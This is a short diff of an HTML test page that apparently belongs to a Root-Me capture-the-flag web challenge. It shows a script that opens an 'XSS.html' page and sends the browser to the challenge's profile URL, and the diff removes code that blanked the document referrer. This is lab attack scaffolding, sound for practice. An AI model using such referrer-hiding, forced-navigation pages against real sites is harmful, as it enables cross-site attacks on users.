@@ -9,9 +9,7 @@
 <body>
   <span>TEST PAGE DE FOU SAH</span>
 <script>
-    delete window.document.referrer; 
-    window.document.__defineGetter__('referrer', function () { return ""; });
-    window.open("XSS.html");
+    window.open("XSS.html","_blank");
     window.location.href="http://challenge01.root-me.org:58003/profile"
 </script>
 
